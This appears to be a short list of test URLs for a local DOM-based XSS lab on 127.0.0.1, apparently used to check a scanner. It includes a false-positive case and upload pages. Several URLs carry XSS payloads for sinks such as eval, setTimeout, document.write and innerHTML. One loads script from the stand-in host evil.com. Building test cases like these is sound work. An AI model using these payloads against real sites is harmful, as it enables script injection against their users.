dom xss

```
http://127.0.0.1:8888/vuln/1.html?test=xxx1x
http://127.0.0.1:8888/vuln/2.html?test=xxx1x
http://127.0.0.1:8888/vuln/3.html?test=xxx1x
http://127.0.0.1:8888/vuln/4.html?test=xxx1x
http://127.0.0.1:8888/vuln/5.html?test=xxx1x
http://127.0.0.1:8888/vuln/6.html
http://127.0.0.1:8888/vuln/7.html?target=aHR0cDovL3d3dy5iYWlkdS5jb20
http://127.0.0.1:8888/vuln/8.html?test=11111
http://127.0.0.1:8888/vuln/9.html?location=111
http://127.0.0.1:8888/vuln/10.html#1111
```

```
http://127.0.0.1:8888/vuln/dombased.php?sink=eval#alert(&apos;xss&apos;);
http://127.0.0.1:8888/vuln/dombased.php?sink=function#alert(&apos;xss&apos;);
http://127.0.0.1:8888/vuln/dombased.php?sink=setTimeout#alert(&apos;xss&apos;);
http://127.0.0.1:8888/vuln/dombased.php?sink=scriptSrc#http://evil.com/xss.js
http://127.0.0.1:8888/vuln/dombased.php?sink=scriptText#alert("XSS")
http://127.0.0.1:8888/vuln/dombased.php?sink=location#javascript:alert("XSS")
http://127.0.0.1:8888/vuln/dombased.php?sink=lochref#javascript:alert(1)
http://127.0.0.1:8888/vuln/dombased.php?sink=docwrite#<script>alert("xss")</script>
http://127.0.0.1:8888/vuln/dombased.php?sink=innerHTML#<img src="http://sdfgofgd.net/" onerror="alert(1)">
```

误报
```
http://127.0.0.1:8888/vuln/fp/1.html?test=lisi
```

```
http://127.0.0.1:8888/vuln/upload_file1.html
http://127.0.0.1:8888/vuln/upload_file2.html
```
